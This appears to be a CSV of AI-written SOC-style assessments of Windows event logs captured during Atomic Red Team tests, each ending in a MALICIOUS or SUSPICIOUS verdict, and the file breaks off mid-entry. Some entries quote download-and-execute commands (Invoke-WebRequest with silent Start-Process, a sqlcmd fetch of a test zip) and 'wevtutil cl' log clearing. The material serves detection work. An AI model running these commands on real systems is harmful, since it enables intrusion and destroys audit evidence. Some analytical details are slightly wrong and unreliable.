Directory Name,AI Response
Download a file with IMEWDBLD.exe,"After a detailed analysis of the provided Windows event logs, the following observations and assessments have been made:

### Observations:
1. **Log Clearance**:
   - Multiple instances of log files being cleared (EventID 104) were observed. The logs cleared include System, Windows PowerShell, and Security logs. The clearing of logs, especially without backup paths, is a common technique used to cover traces of malicious activities.

2. **Use of PowerShell**:
   - There are PowerShell events indicating execution of commands (EventID 600) that include downloading a file from a URL: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml`. The use of PowerShell to download files from the internet can be indicative of malicious activity, especially when targeting potentially sensitive files.

3. **High Integrity Levels**:
   - Multiple processes, including PowerShell, are running at a high integrity level, indicating elevated privileges (Potential Privilege Escalation).

4. **Suspicious Command Line Arguments**:
   - The execution of `imewdbled.exe` via PowerShell is particularly suspicious. The full command line is structured to execute content from an external source, which is commonly associated with malicious activities such as payload delivery or remote code execution. 

5. **Sysmon Logs**:
   - Frequent clearing of specific administrative logs using the `wevtutil.exe` command as observed in the Sysmon logs, executed by `admin_test`, coincides closely with the times of log clearance events found in System and Security logs.

6. **Security Logs**:
   - Privilege escalation events (EventID 4672) showing the assignment of sensitive privileges to the user ""admin_test"".

### Assessment:
The combination of cleared logs, suspicious PowerShell execution, downloads from external sources, and the high integrity execution context provides a compelling case for potential malicious activity. The behaviors observed align with techniques used by threat actors to establish persistence, escalate privileges, or conduct lateral movements without detection.

### Resolution:
**MALICIOUS** 

Given the context and observed activities, the likelihood of these logs indicating legitimate administrative actions is low. The logs strongly suggest an attempt to cover tracks after potentially executing malicious commands or scripts.

### Guidance:
1. **Immediate Response**:
   - Isolate the affected system (Server002) from the network to prevent further potential spread of malicious activities.
   - Preserve an image of the system for forensic analysis.

2. **Investigate**:
   - Conduct a deeper forensic investigation on Server002 to find additional indicators of compromise.
   - Analyze whether the downloaded content (`T1105.yaml`) has been activated or executed any additional malicious payloads.

3. **Remediation**:
   - Change credentials for any accounts that have been used on the affected system.
   - Review and correct any administrative or access policies that may have been exploited.

4. **Monitoring and Logging**:
   - Enable enhanced logging and monitoring to detect similar activities in the future.
   - Regularly audit logs to ensure they are not disabled or tampered with.

Conduct a thorough review to understand the full scope of activities and take appropriate actions to secure the environment."
iwr or Invoke Web-Request download,"Upon analyzing the provided logs, there are several areas of concern indicating potential malicious activity:

1. **Log File Clearing**:
   - **System, Security, and PowerShell logs cleared**: Events 104 and 1102 indicate that logs on the channels System, Security, and Windows PowerShell have been cleared. The user ""admin_test"" executed this action. Clearing logs is often a method used by attackers to cover their tracks after performing unauthorized actions.

2. **Suspicious Command-Line Execution**:
   - Multiple instances of `wevtutil.exe` are used to clear logs (as seen in the `Sysmon` logs). The `wevtutil cl` command is a known technique for clearing event logs, which is suspicious in the context of log clearing and should be investigated.
   
3. **Anomalous Command Use**:
   - A command line in the `Sysmon` logs indicates the execution of `cmd.exe /c powershell.exe iwr`. This appears to download a file from a public GitHub repository. While this file is the LICENSE.txt of the Atomic Red Team, usage of such a command might indicate a test or simulation of malicious behavior or even an actual execution of a malicious script disguised as legitimate.

4. **Out-of-sequence Time Stamps**:
   - `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`: The events 24 and 4616 indicate the system time was changed. Adjusting system time can be used to manipulate event logs, making it harder to track changes and actions. This action by `svchost.exe` should be thoroughly investigated.

5. **`whoami` Execution**:
   - Not inherently malicious, but when scrutinizing in the context of cleared logs and time changes, the use of `whoami.exe` for determining the context in which commands are running can suggest enumeration activity by an attacker.

### Conclusion
The behavior observed in these logs is very indicative of suspicious and potentially malicious activity:

- The clearing of logs (System, Security, PowerShell).
- The time manipulation events.
- The execution of commands that are often associated with post-exploitation activities.

### Resolution
The provided logs should not be considered BENIGN due to the outlined actions. The activity captured is more than just anomalous - it exhibits common tactics used by attackers during the exploitation and cover-up phases.

**Resolution: MALICIOUS**

### Guidance
- Immediate containment is advised to prevent further potential compromise.
- Analyze the machine for other artifacts of compromise, such as suspicious network connections or unauthorized user accounts.
- Investigate the source and content of the PowerShell script that was executed.
- Conduct a full investigation on the user's account `admin_test`, as it is the principal account associated with most of the suspicious activity.
- Implement stricter access controls and monitoring to prevent similar occurrences in the future, such as auditing changes to event logs and time settings."
Lolbas replace.exe use to copy UNC file,"### Log Analysis

1. **Security Log**
   - EventID 1102, ""LogFileCleared"": The security logs were cleared by the user `admin_test`. Clearing logs can wipe evidence of activities, which is commonly considered a suspicious action unless performed by a legitimate admin during approved maintenance.

2. **System Log**
   - Multiple events with EventID 104 indicating the clearing of system logs across various channels like System and Windows PowerShell. This suggests a deliberate attempt to remove evidence or prevent logging of certain activities. It was again executed by the user `admin_test`.

3. **Sysmon Log**
   - Persistent use of `wevtutil.exe` to clear logs across different channels (Sysmon, System, Security, and Windows PowerShell) indicates an attempt to cover tracks. The process was executed by `admin_test` with high integrity level and uses a command line to clear logs, a typical malicious activity.
   - There are multiple instances of processes like `cmd.exe` and other utility executions that appear to perform file operations using system-level utilities inconsistent with regular administrative functions.
   - The execution of a known test or simulation tool `/AtomicRedTeam/atomics/T1105/` suggests that there might have been an operational readiness test or simulation being conducted, but it can also be used to mimic or simulate adversarial activity for hiding real actions.

4. **Application Log**
   - Regular application events for Edge Update, indicating service activities, which appear benign during this time frame.

### Assessment
- **Indicators of Compromise**: The logs present several indicators that point towards potential malicious activity. The key actions are the systematic clearing of logs across various essential channels, execution of system utilities with high integrity, and possible simulation/mimicry of adversarial techniques.
- **Threats or Risks Identified**: 
  - Clear intention to eradicate log evidence, which strongly suggests a cover-up of unauthorized actions.
  - Execution of potential simulation activities could provide cover for malicious actions.

### Guidance on How to Proceed
1. **Immediate Action**:
   - Confirm the legitimacy of the `admin_test` user actions. These actions should be matched against any authorized maintenance schedules or activities.
   - Conduct a forensic review of `Server002` to detect any signs of unauthorized access or lateral movement from this host.
   - Review all network activity and communications originating from `Server002` around the time of these events to identify any possible data exfiltration or connections to known malicious IPs.

2. **Security Enhancement**:
   - Implement stricter logging and alerting mechanisms for log clearing activities.
   - Regularly back up logs to a secure, centralized location to prevent tampering.
   - Review and restrict permissions for utility execution related to logging and system-level operations.

### Resolution
**Resolution: MALICIOUS**

The consistent pattern of log-clearing alongside the use of system utilities suggests actions consistent with an attacker attempting to cover their tracks, making this activity malicious. Immediate investigation and response are strongly recommended."
DNS over HTTPS Large Query Volume,"The provided logs indicate several activities, some of which are concerning and warrant further investigation. Here's a detailed analysis:

### Suspicious or Anomalous Behavior

1. **Event Log Clearances**:
   - There's evidence of log file clearance events for the System, Security, and Windows PowerShell channels initiated by the user ""admin_test"". This is denoted by Event IDs 104 and 1102, which suggest that logs were intentionally cleared.
   - Clearing logs is a common tactic used by threat actors to cover their tracks.

2. **Use of `wevtutil.exe`**:
   - The tool `wevtutil.exe` was used to clear event logs (Sysmon, Security, System). As `wevtutil.exe` is a legitimate Windows utility for managing event logs, its usage in this context appears malicious given the subsequent log deletions.

3. **Questionable PowerShell Activity**:
   - A PowerShell command was executed by the user ""admin_test"" containing a script loop that sends requests to a specific endpoint using `Invoke-WebRequest`. The target here seems to be conducting a large number of DNS requests to IP ""8.8.8.8"" with unpredictable subdomains crafted using `Get-Random`.
   - This activity is unusual and aligns with behaviors often associated with DNS tunneling or reconnaissance efforts.

4. **Privilege Utilization by ""admin_test""**:
   - Several instances of privileged actions taken by ""admin_test"" carrying high privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) that could be leveraged for unauthorized access or further destructive actions.

5. **IP Address Anomalies**:
   - Multiple access attempts from IP ""192.168.0.102"" and the IPv6 address ""fe80::e3b5:5371:12a8:9c77"" which should be scrutinized if these are known endpoints or associated with the authorized network.

6. **Microsoft Edge Update Processes**:
   - A sequence of activities related to Edge updates is visible. While these could be legitimate, their correlation with the elevated activities of ""admin_test"" could necessitate a review of any tampering or forced malicious updates.

### Conclusion and Assessment

Based on the activity in the logs:
- The clearance of logs, potentially malicious PowerShell execution, and indicators of potential privilege escalation or use make this system quite suspicious.
- The specific use of PowerShell in looping DNS requests alongside the cleared logs raises red flags of potential reconnaissance or data exfiltration activities.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions**:
   - Conduct a detailed investigation on user ""admin_test"". Check user's recent activities, login history, and validate the necessity of any privileged accesses.
   - Isolate the affected machine (Server002) from the network until a forensic analysis can confirm suspicious activities.

2. **Forensic Analysis**:
   - Retrieve and analyze any additional logs or disk images from the affected host if possible before connecting them back online.
   - Look for data exfiltration logs, foreign IP connections, and unauthorized changes to system configurations.

3. **Security Hardening**:
   - Disable or closely monitor the usage of tools like PowerShell and wevtutil on critical systems.
   - Reinforce log retention policies and implement alerts for log clearance events.
   - Ensure all updates (particularly Microsoft Edge in this context) are coming from legitimate channels.

4. **User Awareness and Training**:
   - Conduct training sessions for administrative staff focusing on proper management practices and recognizing signs of suspicious system usage.

Overall, further investigation is required to determine whether breaches have occurred or if there are additional signs of compromise."
Run ngrok,"After analyzing the provided event logs, several points indicate potentially malicious activity:

1. **Processes and Command Executions**:
   - The consistent use of `wevtutil.exe` (Event Log Utility) to clear logs (`cl System`, `cl Application`, `cl Security`, and several others) is a common technique used by attackers to cover their tracks by clearing Windows Event Logs.
   - The execution of `ngrok.exe` via PowerShell to open an external TCP tunnel on port 3389 is highly suspicious. Port 3389 is typically used for Remote Desktop Protocol (RDP) connections, and opening this port could indicate an attempt to establish a remote session, possibly for unauthorized access.

2. **Suspicious PowerShell Activity**:
   - There are multiple PowerShell executions creating jobs to run `ngrok.exe`. This pattern aligns with attempts to maintain persistence or gain remote access via PowerShell scripts.
   - The PowerShell command composes several actions in one execution, indicating a complex script designed for a specific task, which isn't typical for regular administrative tasks.

3. **Log Clearing Activities**:
   - The security log records events where logs were cleared (EventID 1102) and the presence of `wevtutil.exe` being used to clear operational channel logs for `Sysmon`. This is a strong indicator of potentially malicious activity as log clearing is not common operational behavior.

4. **Account Activity**:
   - All suspicious activities are conducted under the user account `SERVER002\admin_test`, which requires further investigation. This user could potentially be compromised.

In summary, the logs contain strong evidence of potentially malicious behavior, characterized by attempts to hide activities using log clearing, potential unauthorized remote access attempts via `ngrok.exe`, and orchestrated through PowerShell scripts.

**Assessment**: MALICIOUS

**Guidance on how to proceed**:
- Immediately isolate the `Server002` server from the network to prevent further unauthorized access.
- Conduct a thorough investigation into the `admin_test` account and the integrity of the account credentials.
- Perform forensic analysis on system and network logs to gain more insights into the attacker's actions and entry point.
- Consider enhancing security measures, including reviewing PowerShell execution policies, restricting `ngrok`, and increasing monitoring of privileged accounts and log ins.
- Inform stakeholders and prepare for incident response procedures as appropriate."
Printer Migration Command-Line Tool UNC share folder into a zip file,"Upon reviewing the provided event logs, the following analysis and assessment have been conducted:

### Analysis of Suspicious Activities:
1. **Event Log Clearing:**
   - **Security Log:** EventID ""1102"" indicates that the security log on ""Server002"" was cleared by the user ""admin_test"". The security event log is crucial for security auditing, and its clearing can often indicate an attempt to cover up malicious activity.
   - **System Log:** EventID ""104"" and ""3572"" showing the system and Windows PowerShell logs cleared by ""admin_test"". Similar suspicious behavior as with the security log clearing.

2. **Process Execution:**
   - **Sysmon Log - `wevtutil.exe`:** Multiple entries show execution of ""wevtutil.exe"" with the `cl` (clear log) command, targeting different logs: ""Sysmon"", ""Application"", ""System"", and ""Security"". This aligns with the log clearing entries observed and suggests intentional deletion of event logs.
   - **Sysmon Log - `cmd.exe`:** The execution of ""cmd.exe"" with a command line indicative of a scripted activity: deleting ""PrintBrm.zip"" in the temp directory and running ""PrintBrm.exe"" on a local network share. This action seems to reference Atomic Red Team's technique T1105, which is known for remote file copy (perhaps part of a test or attack simulation).
   - **Sysmon Log - Utility Commands:** Commands like ""whoami.exe"" and ""hostname.exe"" were executed. These could be part of routine administrative checks or reconnaissance activities that fall under common post-exploitation behavior.

3. **Time Change Events:**
   - Security and System logs show EventID ""4616"" and ""1"" indicating slight time adjustments on the system via ""svchost.exe"". While minor, unauthorized time changes can sometimes be part of attempts to manipulate timestamps.

### Conclusion:
Based on the analysis, the behavior within these logs is highly suspicious:

- **Log Clearing:** Repeated use of `wevtutil.exe` to clear logs combined with system/security log clearance suggests an attempt to hide tracks.
- **Potential Threat Simulation or Malicious Activity:** The command invoking ""PrintBrm.exe"" on a network share associated with known attack simulation techniques (e.g., Atomic Red Team) indicates either a security assessment or malicious testing.

### Recommendation and Resolution:
Given the observed activities:
- **Resolution:** SUSPICIOUS
- **Actions:** 
  - Verify the credential and actions of the account ""admin_test"" to determine if these actions were authorized or part of planned security testing.
  - Conduct a full review of related systems and network shares for further indicators of compromise or unauthorized access.
  - Implement monitoring and alerting for similar activities, especially the clearing of logs and execution of potentially harmful commands.
- **Engage with the IT or security teams** to discuss findings and verify if any ongoing tests could explain the observed behavior, reducing the risk of false positives."
OSTAP Worming Activity,"Upon reviewing the log entries provided, several key points emerge that necessitate a detailed examination. Here is a breakdown of the suspicious activities observed:

1. **Log Clearing Events**: 
   - The System, Security, and Windows PowerShell logs were cleared by a user named ""admin_test"" at ""2024-10-24 11:27:50."" This is logged by Event ID 1102 in the Security log and Event ID 104 in the System log. The action of clearing logs is considered highly suspicious as it might be an attempt to cover tracks after malicious activities have been carried out.

2. **Process Execution Events**: 
   - Multiple instances of ""wevtutil.exe"" are observed executing commands to clear event logs such as System, Security, and Windows PowerShell logs. These are listed in the Sysmon logs with Process IDs 1744, 6480, 2548, and 2848. This behavior, especially combined with log clearance, indicates an attempt to remove traces of activities from event logs.
   - There is an execution of ""cmd.exe"" with a complex command sequence that references writing scripts and deleting files associated with test scripts indicating a simulation of a worm propagation test (related to T1105, a technique often used to simulate file transfer over a network).

3. **Privilege Escalation**: 
   - Processes were executed at a high integrity level, indicating potential privilege escalations which can be indicative of compromised credentials or elevated permissions being misused.

4. **Anomalous Timing Adjustments**:
   - Time change events logged (Event ID 4616) suggest possible attempts to manipulate system time, possibly to facilitate the alignment of timestamps or evade detection based on timestamps.

5. **Command-Line Utility Usage**:
   - The extensive use of ""wevtutil.exe"" for log clearance points towards an attempt to obfuscate prior activities. Typically, this utility is not frequently used in normal, benign operations at this scale and frequency, particularly with the context of clearing logs.

Based on the combination of these factors:

- The clearing of logs, especially those that would typically contain records of significant system activities or commands, suggests an effort to erase potential evidence of an unauthorized or malicious operation.
- The occurrence of specific scripted execution commands and command-line tools is common in lateral movement attempts or establishing persistence within a network.
- Overall, these events are characterized not only by unusual patterns but also by activities commonly associated with malware, cyber attacks, or red team operations.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Response Actions**: Isolate the affected machine (Server002) from the network to prevent further spread of potential malicious activity.
- **Credentials Review**: Reset credentials for the user ""admin_test"" and any other accessed accounts, as they may be compromised.
- **Detailed Threat Hunt**: Conduct a thorough investigation and threat hunting process across the network to identify other potentially affected systems.
- **Forensic Analysis**: Engage in detailed forensic analysis particularly focusing on the timelines around the events of log clearing and command execution.
- **Strengthen Security Measures**: Review and tighten audit policies, especially around log retention and reviewing privileges to services and utilities like wevtutil.
- **Educate and Update**: Inform security teams and stakeholders and ensure systems are updated and protective measures are reinforced."
DNS Long Domain Query,"Given the logs provided, let's assess the entries to identify any potential indicators of compromise or unusual activity.

### Analysis:

1. **Process Execution:**
   - Multiple `Sysmon` logs indicate the execution of baseline Windows commands such as `whoami.exe`, `hostname.exe`, and system utilities like `wevtutil.exe`. These may be suspicious depending on context, especially if they occur outside of standard operations or by unusual users, but they are legitimate Windows executables.
   
2. **Clearing Logs:**
   - The `System`, `Security`, and `PowerShell` logs have been cleared by the user `admin_test`. This action is suspicious as it can be a tactic used to hide malicious activity. Particularly concerning is the clearing of security logs given the importance of those logs in post-compromise analysis.

3. **PowerShell Script Execution:**
   - A PowerShell script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1071.004\src\T1071-dns-domain-length.ps1` was executed. The Atomic Red Team is a well-known open-source project that provides researchers with a library of tests to validate security-relevant configurations and detections. However, executing this script without prior authorization or documentation can indicate unauthorized penetration testing or simulation of attack techniques, which might suggest potential misuse or testing without permission.

4. **Edge Update Execution:**
   - The logs display multiple entries concerning the Microsoft Edge Update service starting and stopping. This activity on its own is not inherently suspicious unless it leads to unexpected behavior or result in anomalies typically unrelated to normal Edge updates.

5. **Privilege Escalation:**
   - A log entry shows privilege assignment (`4672` event ID), giving a broad set of privileges to the `admin_test` account (such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). This could reflect a permissible configuration within the environment, but could also be an indicator if these high-level privileges are unexpected for this account.

### Assessment:

- **Indicators of Suspicious Behavior:**
  - The clearing of System, Security, and PowerShell logs by `admin_test` is a significant red flag.
  - Execution of a specifically noted script from the Atomic Red Team suite without clear indication of legitimate testing context raises concerns.

### Resolution:
- **SUSPICIOUS** – There is suspicious activity that doesn't appear justified by the provided logs. Specifically, log clearing and unauthorized script execution require further scrutiny.

### Guidance:
- **Immediate Steps:**
  - Investigate the intent behind the execution of the PowerShell script. Verify if it was part of an authorized security assessment.
  - Determine the context in which the logs were cleared and whether this action was documented, authorized, or explained by legitimate operational needs.
  - Review user access control policies and monitoring to ensure that privilege escalations and access to sensitive accounts are tracked and alerted appropriately.
  
- **Long-term Steps:**
  - Implement rigorous user behavior analytics to promptly detect similar suspicious activities in the future.
  - Enforce logging policies to maintain the integrity and availability of log data critical for incident response and compliance.

Given these findings, I recommend a thorough audit of the actions taken by `admin_test` and a review of the system's security protocols to prevent potential misuse."
XOR Encoded data,"Upon analyzing the given Windows event logs, several indicators suggest potential malicious activity:

1. **Log Cleared Events:**
   - System and Security event logs were cleared by a user (`admin_test`) at `2024-10-25 11:13:04`. Clearing event logs is a technique often used by attackers to cover their tracks. Event IDs 104 and 1102 indicate log clearing for System and Security logs, respectively.

2. **Time Manipulation:**
   - Time was changed on the system, as indicated by Event ID 4616. This could be an attempt to manipulate timestamps and further obscure malicious activities.

3. **Suspicious PowerShell Activity:**
   - Multiple events tied to PowerShell use a script obscured with variables and XOR obfuscation. The script attempts to send data to an external server (`example.com`). This PowerShell command is not typical for system administration tasks and is a common method for data exfiltration and command execution in attacks.

4. **Unusual Command-Line Executions:**
   - There are several instances of PowerShell and other utilities like `wevtutil.exe` being run directly with command-line arguments from unusual directories, hinting at potential script execution or automated tasks.

Given the suspicious activity noted, particularly the clearing of logs, time manipulation, and use of PowerShell for potentially malicious scripting, this is a strong indicator of potential compromise.

**Assessment: MALICIOUS**

**Recommendations:**
- Immediately investigate the `admin_test` account for unauthorized access or compromise.
- Conduct a full malware scan on the affected host (`Server002`) to identify and remediate any potential threats.
- Review and reinforce security policies, especially around logging and administrative actions.
- Isolate the affected machine and monitor network traffic for unusual outbound connections.
- Consider changing credentials for any compromised accounts and conducting a security audit to prevent future incidents."
TeamViewer Files Detected Test on Windows,"Upon analyzing the provided logs, the following findings and assessments can be made:

1. **PowerShell Activity:**
   - A PowerShell script was executed that downloads and installs TeamViewer using the command:
     ```
     Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
     Start-Process -Wait $file1 /S; 
     Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
     ```
   - This behavior, which involves downloading an executable file from the internet and executing it with installation arguments (`/S` for silent installation), is often seen in both benign administrative tasks and malicious activities, depending on the intent and context.

2. **Sysmon Activity:**
   - Multiple instances of TeamViewer processes (`TeamViewer_Setup.exe`, `TeamViewer.exe`, `tv_x64.exe`, and `tv_w32.exe`) are noted to have run, correlating with the PowerShell command execution.
   - A scheduled task named `TVInstallRestore` was created using `schtasks.exe` to run `TeamViewer_.exe` on logon, a behavior often linked with persistence mechanisms in malware.
   - A process `wbem\WmiPrvSE.exe` (WMI Provider Host) executed, which is often used for legitimate purposes but can also be used maliciously for reconnaissance or lateral movement.

3. **Security and System Logs:**
   - Event logs indicating `LogFileCleared`, which suggests that someone attempted to clear logs potentially to cover up activities. The user `admin_test` played a role in log manipulations, including clearing security logs, which is a well-known tactic for obfuscating malicious actions.
   - Privilege escalation is indicated by multiple ""user privilege assigned"" logs and unusual service installation (`TeamViewer_Service.exe`) by the user `admin_test`.

### Assessment:

- **Suspicious Behavior Noted:**
  - The downloading, installation, and execution of a remote access tool like TeamViewer in this manner is suspicious if not explicitly approved and documented by IT policies.
  - The creation of a scheduled task for TeamViewer and the clearing of event logs without apparent legitimate reasons heightens the risk profile.
  - Elevated privileges and security log clearance by `admin_test` raise concerns about unauthorized actions or malpractice.

### Resolution:

Given the activities documented, I would classify this as **SUSPICIOUS** with high potential risk. Further investigation is warranted to determine the intent behind these activities:

- **Verify if the execution of these PowerShell commands and TeamViewer installation was authorized by IT policies.**
- **Investigate whether 'admin_test' actions were sanctioned and review their access logs and activity details to rule out unauthorized or malicious intent.**
- **Conduct a forensic analysis of any persistence mechanisms installed, like the scheduled task, and verify potential unauthorized access or data exfiltration.**

These steps will help ascertain whether the suspicious activities reflect a security incident or erroneous legitimate maintenance actions."
Tor Proxy Usage - Windows,"Upon analyzing the provided logs, several suspicious activities are notable:

1. **Log Cleared Events**: There are multiple instances where the event logs were cleared by the user ""admin_test"" on ""Server002"". These events are recorded with Event ID 104 in the System log and Event ID 1102 in the Security log. This activity is typically associated with an attempt to cover tracks and can indicate malicious activity.

2. **PowerShell Usage with Encoded Commands**: The logs show extensive use of PowerShell with encoded commands. The commands appear obfuscated, which is often used to hide the true intent of the PowerShell script. Notably, the PowerShell logs indicate the execution of a command involving the ""tor.exe"" from the ""AtomicRedTeam"" repository, a tool commonly used to simulate adversarial attack techniques for testing security controls.

3. **Execution of Potentially Malicious Programs**: There's evidence of execution of ""tor.exe"", a legitimate tool that can also be used for anonymity purposes in malicious contexts. The existence of PowerShell commands initiating this along with sleep and stop-process commands poses a potential risk of unauthorized activities or communication through the Tor network.

4. **Process Creation and Execution Patterns**: Several suspicious processes such as ""conhost.exe"", ""cmd.exe"", and various instances of ""CompatTelRunner.exe"" observed in the Sysmon logs are involved in unusual patterns, and some seem to be executed from unexpected directories typically associated with user activity which might indicate malicious intent, especially given the context of PowerShell encoded commands and log clearing.

5. **Privileges and User Activities**: The activity of the user ""admin_test"" includes high-level privilege usage and altering system logs, which should be scrutinized, especially if this user typically does not normally perform such operations.

Based on these observations, the assessment of the situation leans towards potential compromise. Though not definitively malicious without further context or definitive evidence of hostile actions, the described patterns and activities are highly suspect and warrant further investigation.

**Resolution**: **SUSPICIOUS**

**Guidance on how to proceed**:

- Perform a thorough forensic analysis of the affected machine ""Server002"" to understand the intent and scope of the activities observed.
- Review user account activity to determine if ""admin_test"" has been compromised or if the user was legitimately performing these tasks.
- Investigate network traffic potentially associated with the Tor network to identify unauthorized communications.
- Evaluate system integrity and scan for potential backdoors or malware.
- Reinforce endpoint protection measures, ensuring scripts and applications like PowerShell are logged and monitored closely.

Immediate containment and eradication steps should be considered if further investigation confirms a breach, alongside notifying relevant stakeholders."
File Download with Sqlcmd.exe,"After analyzing the event logs provided, several events stand out that indicate suspicious and potentially malicious activities:

1. **Log Clearance Events:**  
   In the Security log, Event ID 1102 from the `Microsoft-Windows-Eventlog` provider indicates that the logs were cleared by the user `admin_test`. This action can be an indicator of log tampering, which is often associated with an attempt to cover up malicious activity.

2. **Suspicious PowerShell Execution:**
   The PowerShell log events reveal the execution of a PowerShell command that downloads a potentially malicious file from a remote source (URL). The command:
   ```powershell
   powershell.exe & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}
   ```
   This command involves downloading a file from the internet directly to the system, which is a technique often used for downloading payloads in a cyber attack scenario.

3. **Event Logs with `wevtutil.exe`:**
   Multiple instances of `wevtutil.exe cl` commands (clear commands for various Windows logs like System, Security) were observed within the Sysmon logs, indicating that event logs were cleared deliberately. This aligns with covering tracks, a typical behavior post-exploitation.

4. **Unusual Process Execution:**
   The execution of processes like `whoami.exe` and `hostname.exe` in quick succession could also be part of a reconnaissance phase to gather information about the system environment.

5. **Installation-related Activity:**
   In the Sysmon log, there is mention of Microsoft Edge installer activities under `NT AUTHORITY\SYSTEM`. While this might be part of legitimate software updates, it should be further scrutinized to ensure legitimacy, especially in the context of other suspicious activities.

**Assessment and Resolution:**

- The combination of log clearing, suspicious PowerShell execution involving a remote download, and the overall behavior in the logs strongly indicates a potential security breach. It appears consistent with an attack pattern that includes infiltration (via PowerShell), reconnaissance (e.g., `whoami.exe`), and cleanup operations (log clearing).
  
- **Final Resolution:** MALICIOUS

**Guidance on How to Proceed:**

1. **Isolate the Affected System:** Disconnect the compromised system from the network to prevent any further spread and damage.

2. **Conduct a Thorough Forensic Investigation:** Analyze the downloaded file to determine its nature and any additional payloads or malware it may contain. Investigate any anomalies seen in the applications and processes executed during the timeframe of interest.

3. **Review Access Logs:** Check if unauthorized access was gained and whether other parts of the network may have been accessed or compromised.

4. **Restore from Backup:** If feasible, consider reverting the system to a secure state from a known clean backup before the suspicious activity was logged.

AnyDesk Files Detected Test on Windows,"Based on the detailed analysis of the provided Windows event logs, several activities raise suspicion and potentially indicate malicious behavior:

### Findings:

1. **Log File Clearing**:
   - There are multiple events across the logs that indicate log clearing activities using `wevtutil.exe` by the `admin_test` user. This is evident from the `Sysmon` and `Security` logs:
     - `EventID: 1102` and `EventID: 104` in the `Security` and `System` logs indicate that application, system, and PowerShell logs were cleared.
     - This behavior is common among malicious actors attempting to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The `Windows PowerShell` logs show a script execution that downloads and starts `AnyDesk.exe` using PowerShell:
     - `EventID: 600` details the use of `Invoke-WebRequest` and `Start-Process` to download `AnyDesk` to the user’s desktop and execute it.
     - `AnyDesk` is a legitimate remote access tool, but its usage in an unsolicited manner can suggest lateral movement or unauthorized access attempts.

3. **Execution of Suspicious Applications**:
   - The `Sysmon` logs confirm the execution of `AnyDesk.exe` (`EventID: 1`) shortly after being downloaded, implying an immediate action on the host.
   - The transitions from a PowerShell script directly leading to an executable’s launch is unusual without a legitimate IT task or update context.

### Conclusion:

- **Resolution: MALICIOUS**
  - The combination of evidence—clearing of logs, suspicious PowerShell activity downloading remote access software, followed by its execution—strongly suggests malicious intent and potential compromise of the system. 

### Recommendations:

1. **Immediate Isolation**: Isolate the affected host (`Server002`) from the network to prevent further potential spread.
2. **Further Forensic Investigation**: Conduct a deep dive forensic investigation to understand the full scope and origin of the incident, including any lateral movement and data exfiltration activities.
3. **User Activity Review**: Review `admin_test` user account activities across the organization’s network for any unusual patterns or access.
4. **Security Patches and Hardening**: Ensure all machines are up-to-date with security patches and apply hardening policies to limit administrative access and PowerShell execution capabilities.
5. **Activity Monitoring and Alerts**: Implement more rigorous monitoring and automated alerting for activities such as log clearing and PowerShell usage indicative of data transfers or remote access tool downloads.

This incident reflects a high threat and poses substantial risks to the network's integrity and data security. Immediate action is necessary to mitigate potential damage."
GoToAssist Files Detected Test on Windows,"**Analysis of the Logs**

1. **Application Log Analysis:**
   - Events indicate the installation of ""GoTo Opener"" from a user directory. The events show normal installation completion messages without errors.
   - A certificate authentication event (CAPI2) is observed which seems to be a typical behavior during installation processes.

2. **System Log Analysis:**
   - Several Eventlog clearing entries by the user 'admin_test' were noticed, specifically for System, Windows PowerShell, and Security logs. This is highly suspicious behavior, typically indicative of someone attempting to cover their tracks after potentially malicious activities.
   - Time synchronization events logged, but this is generally routine system behavior.

3. **Sysmon Log Analysis:**
   - The use of `wevtutil.exe` indicates log management activities. Specifically, clearing logs is either suspicious when done concurrently with other suspicious activity.
   - Installation and launch of ""GoToAssist"" through PowerShell is shown. The command: `Invoke-WebRequest` fetching an executable and using `Start-Process` to run it in silent mode (`/S`) indicates potential unauthorized software being executed.
   - Newly observed connections to external IP addresses through `GoToAssist` command lines raise potential concerns for data transfer or unauthorized remote access.
   - Sysmon records the use of several processes related to Microsoft Edge Updates, which appear routine from a system maintenance perspective.

4. **Security Log Analysis:**
   - Log clearance events are present but lack detailed user context due to clearance.
   - Privilege assignments found (EventID 4672) can be normal admin activity unless abused for unauthorized actions.
   - Logon events (4624) appear typical but because of log clearance, the context of logon is questionable.

5. **Windows PowerShell Log Analysis:**
   - PowerShell initiated with a command to download and execute ""GoToAssist"" installer silently. The script demonstrates intentional engagement with potentially automated actions.

**Assessment and Resolution:**

Given the analysis of the provided logs:

- Multiple logs are cleared which could imply intentional concealment of activity.
- PowerShell activity shows the download and execution of external files which can often indicate malicious or unauthorized software execution.
- Connections to external IPs via the GoToAssist utility may be indicative of potential data exfiltration or unauthorized access.

**Resolution: MALICIOUS**

**Recommendations:**
- Immediate incident response actions are required. Isolate the affected host, 'Server002', to prevent potential spread within the network.
- Perform a comprehensive malware scan and forensics analysis to identify any signs of compromise or achieved persistence by the attacker.
- Review user activities specifically for 'admin_test' to assess the scope of the breach.
- Strengthen monitoring of unusual activities, especially log clearance and PowerShell command executions towards external addresses.
- Educate users on safe software practices and warn against downloading and running unauthorized software, especially from unapproved sources."
Ammyy Admin Software Execution,"The provided Windows event logs indicate several activities that point toward potentially malicious behavior on the host, Server002. Below is a detailed analysis of the logs:

1. **Event Log Clearing (Security and Sysmon Logs):**
   - Security Event ID 1102 indicates that the security log was cleared by the user ""admin_test"". This is a significant indicator of malicious activity, as clearing event logs is a common practice by attackers to cover their tracks.
   - Sysmon logs also show the use of ""wevtutil.exe"" for clearing logs in multiple events (Process CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl <Log>`). This includes clearing of the Microsoft-Windows-Sysmon/Operational, Application, System, and Windows PowerShell logs.

2. **Suspicious PowerShell Activity:**
